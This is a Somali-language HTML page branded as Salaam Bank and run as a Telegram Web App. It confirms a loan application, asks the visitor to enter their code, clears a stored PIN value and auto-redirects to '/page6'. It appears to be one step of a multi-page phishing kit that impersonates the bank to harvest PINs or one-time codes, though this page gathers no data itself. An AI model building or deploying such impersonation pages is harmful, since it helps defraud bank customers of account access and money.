<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Codsiga Waa La Gudbiyay - Salaam Bank</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bank-primary: #008751;
            --bg-color: #f2f2f2;
            --card-bg: #ffffff;
            --text-dark: #333333;
            --text-muted: #666666;
        }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        .toast-notification { position: absolute; top: 25px; background-color: #212833; color: #ffffff; padding: 12px 20px; border-radius: 12px; display: flex; align-items: center; gap: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.18); font-size: 14px; font-weight: 600; }
        .toast-icon { width: 22px; height: 22px; background-color: var(--bank-primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }
        .card { background: var(--card-bg); width: 90%; max-width: 420px; margin-top: 45px; padding: 40px 24px 35px; border-radius: 24px; box-shadow: 0 6px 25px rgba(0, 0, 0, 0.04); display: flex; flex-direction: column; align-items: center; text-align: center; }
        .check-circle { width: 88px; height: 88px; background-color: var(--bank-primary); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 28px; color: white; font-size: 38px; font-weight: bold; }
        .main-title { font-size: 26px; color: var(--bank-primary); margin: 0 0 20px; font-weight: 800; }
        .message-text { color: var(--text-muted); font-size: 15px; margin: 0 0 16px; line-height: 1.55; max-width: 320px; }
        .redirect-box { background-color: #f4f4f4; border-radius: 12px; padding: 16px 20px; margin: 20px 0 16px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 10px; color: var(--bank-primary); font-weight: 700; font-size: 15px; }
        .spinner { width: 18px; height: 18px; border: 2.5px solid #e0e0e0; border-top: 2.5px solid var(--bank-primary); border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn-outline { background-color: transparent; color: var(--text-dark); border: 1px solid #dcdcdc; width: 100%; padding: 14px; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>
<div class="toast-notification">
    <div class="toast-icon">✓</div>
    <div>🎉 Codsiga waa la gudbiyay!</div>
</div>

<div class="card">
    <div class="check-circle">✓</div>
    <h1 class="main-title">Codsiga Waa La Gudbiyay</h1>
    <p class="message-text">Codsigaaga daynta waa la helay. Fadlan sug inta la ansixinayo.</p>
    <p class="message-text">Gali koodhkaaga si aad u sii waddo.</p>
    
    <div class="redirect-box">
        <div class="spinner"></div>
        <span>U gudubka <span id="timer">3</span>s...</span>
    </div>
    
    <button type="button" class="btn-outline" onclick="goToPage6()">Hadda Gal</button>
</div>

<script>
    let timeLeft = 3;
    let interval;
    function goToPage6() {
        if (interval) clearInterval(interval);
        localStorage.removeItem('lastPin');
        window.location.href = "/page6";
    }
    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) { tg.ready(); tg.expand(); }
        interval = setInterval(() => {
            timeLeft--;
            if (timeLeft <= 0) { clearInterval(interval); goToPage6(); return; }
            document.getElementById('timer').textContent = timeLeft;
        }, 1000);
    };
</script>
</body>
</html>
